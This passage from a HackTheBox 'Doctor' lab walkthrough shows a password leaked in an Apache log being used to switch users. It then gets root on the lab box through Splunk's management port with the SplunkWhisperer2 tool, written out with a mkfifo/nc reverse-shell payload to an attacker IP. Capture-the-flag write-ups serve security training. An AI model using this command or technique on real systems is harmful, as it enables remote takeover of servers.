<span class="nt">-rw-r-----</span>  1 root adm     664054 Sep 15 14:27 access.log.6.gz
<span class="nt">-rw-r-----</span>  1 root adm        384 Sep 14 10:07 access.log.7.gz
<span class="nt">-rw-r-----</span>  1 root adm       3018 Sep  7 17:24 access.log.8.gz
<span class="nt">-rw-r-----</span>  1 root adm       1338 Sep  6 22:46 access.log.9.gz
<span class="nt">-rw-r-----</span>  1 root adm      21578 Sep 17 16:23 backup
<span class="nt">-rw-r-----</span>  1 root adm        460 Sep 15 00:00 error.log.10.gz
<span class="nt">-rw-r-----</span>  1 root adm        476 Sep  7 17:46 error.log.11.gz
<span class="nt">-rw-r-----</span>  1 root adm        537 Sep  6 22:47 error.log.12.gz
<span class="nt">-rw-r-----</span>  1 root adm        680 Sep  5 11:58 error.log.13.gz
<span class="nt">-rw-r-----</span>  1 root adm        341 Sep  5 00:00 error.log.14.gz
<span class="nt">-rw-r-----</span>  1 root adm        789 Sep 28 15:07 error.log.2.gz
<span class="nt">-rw-r-----</span>  1 root adm       1092 Sep 23 15:42 error.log.3.gz
<span class="nt">-rw-r-----</span>  1 root adm        846 Sep 22 13:03 error.log.4.gz
<span class="nt">-rw-r-----</span>  1 root adm        655 Sep 22 10:40 error.log.5.gz
<span class="nt">-rw-r-----</span>  1 root adm        352 Sep 19 00:00 error.log.6.gz
<span class="nt">-rw-r-----</span>  1 root adm        424 Sep 18 00:00 error.log.7.gz
<span class="nt">-rw-r-----</span>  1 root adm        428 Sep 17 00:00 error.log.8.gz
<span class="nt">-rw-r-----</span>  1 root adm        629 Sep 16 00:00 error.log.9.gz
<span class="nt">-rw-r--r--</span>  1 root root         0 Jul 27  2020 other_vhosts_access.log
</code></pre></div></div>

<p>Checking its contents, looking for the Query strings of the logged requests, we have observed an interesting entry, as below, which leaks a possible password <strong>Guitar123</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log/apache2<span class="nv">$ </span><span class="nb">awk</span> <span class="nt">-F</span><span class="s2">" "</span> <span class="s1">'{print $7}'</span> backup | <span class="nb">sort</span> | <span class="nb">uniq</span>
/
12.1.2<span class="se">\n</span><span class="s2">"
400
/evox/about
/favicon.ico
/.git/HEAD
/HNAP1
/home
/icons/ubuntu-logo.png
/login
/nmaplowercheck1599231606
/nmaplowercheck1599231646
/post/new
/register
/reset_password?email=Guitar123"</span>
/robots.txt
/sdk
/static/main.css
/static/profile_pics/default.gif
</code></pre></div></div>

<p>As the existing user in the box is <strong>shaun</strong>, trying to change user using this credential turned out to be successful, which allowed us to get the user flag:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shaun@doctor:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 44
drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 <span class="nb">.</span>
drwxr-xr-x 4 root  root  4096 Sep 19 16:54 ..
lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 shaun shaun  220 Sep  6 16:26 .bash_logout
<span class="nt">-rw-r--r--</span> 1 shaun shaun 3771 Sep  6 16:26 .bashrc
drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache
drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config
drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg
drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
<span class="nt">-rw-r--r--</span> 1 shaun shaun  807 Sep  6 16:26 .profile
<span class="nt">-rw-rw-r--</span> 1 shaun shaun   66 Sep 15 12:51 .selected_editor
<span class="nt">-r--------</span> 1 shaun shaun   33 Jan 30 19:12 user.txt
shaun@doctor:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Now running as shaun, noticed that he’s unable to run commands using sudo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shaun@doctor:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>shaun: 
Sorry, user shaun may not run <span class="nb">sudo </span>on d
</code></pre></div></div>

<p>After running <code class="language-plaintext highlighter-rouge">linpeas.sh</code> from <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">PEASS - Privilege Escalation Awesome Scripts SUITE</a> the most prominent way to get a root shell should be through <strong>splunkd</strong> service, which is published through TCP 8089 as previously noticed on Nmap scans.</p>

<p>After browsing it directly, once I have clicked on the <strong>services</strong> link, as image below, an authentication prompt was shown. As the only credential we had is shaun it was the first one tried, which resulted in success <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">.</p>

<p><img src="https://i.imgur.com/4225CjU.png" alt="HTB Doctor - Splunkd" class="align-center"></p>

<p><img src="https://i.imgur.com/JdygFIg.png" alt="HTB Doctor - Services" class="align-center"></p>

<p>As we have credentials to log on to the Splunk Service, the next step is to find a way to get an RCE on this service. Doing some research I came across <a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog</a> that mentions <a href="https://github.com/cnotin/SplunkWhisperer2">GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations</a>, which is a tool that makes easier to get a command execution from the access we already have.</p>

<p>After running the command below, was possible to obtain a reverse shell under root permissions:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 ./PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--port</span> 8089 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f"</span> <span class="nt">--lhost</span> 10.10.10.10
Running <span class="k">in </span>remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
<span class="o">[</span>.] Authenticating...
<span class="o">[</span>+] Authenticated
<span class="o">[</span>.] Creating malicious app bundle...
<span class="o">[</span>+] Created malicious app bundle <span class="k">in</span>: /tmp/tmpcae79s9x.tar
<span class="o">[</span>+] Started HTTP server <span class="k">for </span>remote mode
<span class="o">[</span>.] Installing app from: http://10.10.10.10:8181/
10.10.10.209 - - <span class="o">[</span>04/Feb/2021 19:46:38] <span class="s2">"GET / HTTP/1.1"</span> 200 -
<span class="o">[</span>+] App installed, your code should be running now!

Press RETURN to cleanup

<span class="o">[</span>.] Removing app...
<span class="o">[</span>+] App removed
<span class="o">[</span>+] Stopped HTTP server
Bye!
</code></pre></div></div>

<p>From the reverse shell obtained, was able to get the content from <code class="language-plaintext highlighter-rouge">/root/root.txt</code> without problems</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope it was somehow useful!</p>

<p>See you in the next post! <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
    
      <a href="/en-US/tag/#htb-easy" class="page__taxonomy-item p-category" rel="tag">HTB Easy</a><span class="sep">, </span>
    
      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item p-category" rel="tag">HTB Linux</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/en-US/categories/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-02-06T09:00:00-03:00">February 6, 2021</time></p>

      </footer>

      <section class="page__share" id="sharelinks">
  
    <h4 class="page__share-title">Share on</h4>
  

  <!-- CUSTOM: Localized sharing links -->
  

  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Doctor%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F02%2Fhtb-doctor" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F02%2Fhtb-doctor" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F02%2Fhtb-doctor" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>

  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F02%2Fhtb-doctor" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>

  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F02%2Fhtb-doctor&amp;text=Walktrough%3A+HTB+Doctor" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>

  <!-- END CUSTOM: Localized sharing links -->
</section>


      
  <nav class="pagination">
    
      <a href="#" class="pagination--pager disabled">Previous</a>
    
    
      
        <a href="/en-US/walkthrough/2021/02/htb-academy" class="pagination--pager" title="Walktrough: HTB Academy
">Next</a>
      
    
  </nav>

    </div>

    
      <div class="page__comments">
  
  
      <h4 class="page__comments-title">Leave a comment</h4>
      <section id="utterances-comments"></section>
    
</div>

    
  </article>

  
  
    <div class="page__related">
      <h2 class="page__related-title">You may also enjoy</h2>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://i.imgur.com/TJKS5F6.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      <!-- CUSTOM: Use localized link to posts in archive page -->
      

      
        <a href="/en-US/walkthrough/2021/10/htb-explore" rel="permalink">Walktrough: HTB Explore
</a>
      

      
      <!-- END CUSTOM: Use localized link to posts in archive page-->
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          4 minute read
        
      </span>
    

    <!-- CUSTOM: Post Meta attributes and links -->
    <span class="page__meta-sep page__meta-lang"></span>
    
    
    
    <span class="page__meta-lang"><a href="/walkthrough/2021/02/htb-doctor">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
    

    

    

    
    
    
    
    
  <span class="page__meta-sep page__meta-share"></span>
  <span class="page__meta-share">
    <i class="fas fa-share-alt" aria-hidden="true"></i>
    <a href="#sharelinks">Share</a>
  </span>
    <!-- END CUSTOM: Post Meta attributes and links -->
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hello guys!

This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://i.imgur.com/89b1SdH.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      <!-- CUSTOM: Use localized link to posts in archive page -->
      

      
        <a href="/en-US/walkthrough/2021/10/htb-dynstr" rel="permalink">Walktrough: HTB Dynstr
</a>
      

      
      <!-- END CUSTOM: Use localized link to posts in archive page-->
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    

    <!-- CUSTOM: Post Meta attributes and links -->
    <span class="page__meta-sep page__meta-lang"></span>
    
    
    
    <span class="page__meta-lang"><a href="/walkthrough/2021/02/htb-doctor">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
    

    

    

    
    
    
    
    
  <span class="page__meta-sep page__meta-share"></span>
  <span class="page__meta-share">
    <i class="fas fa-share-alt" aria-hidden="true"></i>
    <a href="#sharelinks">Share</a>
  </span>
    <!-- END CUSTOM: Post Meta attributes and links -->
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hello guys!

This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      <!-- CUSTOM: Use localized link to posts in archive page -->
      

      
        <a href="/en-US/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
</a>
      

      
      <!-- END CUSTOM: Use localized link to posts in archive page-->
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    

    <!-- CUSTOM: Post Meta attributes and links -->
    <span class="page__meta-sep page__meta-lang"></span>
    
    
    
    <span class="page__meta-lang"><a href="/walkthrough/2021/02/htb-doctor">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
    

    

    

    
    
    
    
    
  <span class="page__meta-sep page__meta-share"></span>
  <span class="page__meta-share">
    <i class="fas fa-share-alt" aria-hidden="true"></i>
    <a href="#sharelinks">Share</a>
  </span>
    <!-- END CUSTOM: Post Meta attributes and links -->
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hello guys!

This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="https://i.imgur.com/pUqq7fY.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      <!-- CUSTOM: Use localized link to posts in archive page -->
      

      
        <a href="/en-US/walkthrough/2021/09/htb-pit" rel="permalink">Walktrough: HTB Pit
</a>
      

      
      <!-- END CUSTOM: Use localized link to posts in archive page-->
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          11 minute read
        
      </span>
    

    <!-- CUSTOM: Post Meta attributes and links -->
    <span class="page__meta-sep page__meta-lang"></span>
    
    
    
    <span class="page__meta-lang"><a href="/walkthrough/2021/02/htb-doctor">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
    

    

    

    
    
    
    
    
  <span class="page__meta-sep page__meta-share"></span>
  <span class="page__meta-share">
    <i class="fas fa-share-alt" aria-hidden="true"></i>
    <a href="#sharelinks">Share</a>
  </span>
    <!-- END CUSTOM: Post Meta attributes and links -->
  </p>


    <p class="archive__item-excerpt" itemprop="description">Hello guys!

This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap">
<form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div>
</div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- Mermaid.js -->
<script type="module">
    import mermaid from 'https://unpkg.com/mermaid@9/dist/mermaid.esm.min.mjs';
    const config = {
        "theme": "dark", 
        "startOnLoad": true
    };
    mermaid.initialize(config);
</script>

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
          <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
        
      
        
          <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
        
          <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
    
    <!-- start custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
    
      <li><a href="/en-US/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
    <li><a href="https://davicruz.com/en-US/terms-and-privacy/" rel="nofollow noopener noreferrer"><i class="fas fa-user-shield" aria-hidden="true"></i> Terms of Service and Privacy Policy</a></li>
    <!--<li><a onclick="return klaro.show();"><i class="fas fa-shield-alt" aria-hidden="true"></i> Review consent</a></li>-->
    
      
        
          <li><a href="/">Disponível também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></li>
        
        
        
      
    
      
    
    <!-- end custom: Fix Atom Feed, add Privacy, Consent and Read in other languages -->
  </ul>
</div>

<div class="page__footer-copyright">© 2023 Davi Cruz. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a> &amp; <a href="https://github.com/kurtsson/jekyll-multiple-languages-plugin" rel="nofollow">Multiple Languages Plugin</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- start custom analytics snippet -->

<!-- end custom analytics snippet -->





    <script>
  'use strict';

  (function() {
    var commentContainer = document.querySelector('#utterances-comments');

    if (!commentContainer) {
      return;
    }

    var script = document.createElement('script');
    script.setAttribute('src', 'https://utteranc.es/client.js');
    script.setAttribute('repo', 'davi-cruz/davi-cruz-blog');
    // CUSTOM : Utterances post mapping due to Jekyll Multilanguage
    script.setAttribute('issue-term', 'htb-doctor');
    
    script.setAttribute('theme', 'github-dark');
    script.setAttribute('crossorigin', 'anonymous');

    commentContainer.appendChild(script);
  })();
</script>

  





  </body>
</html>
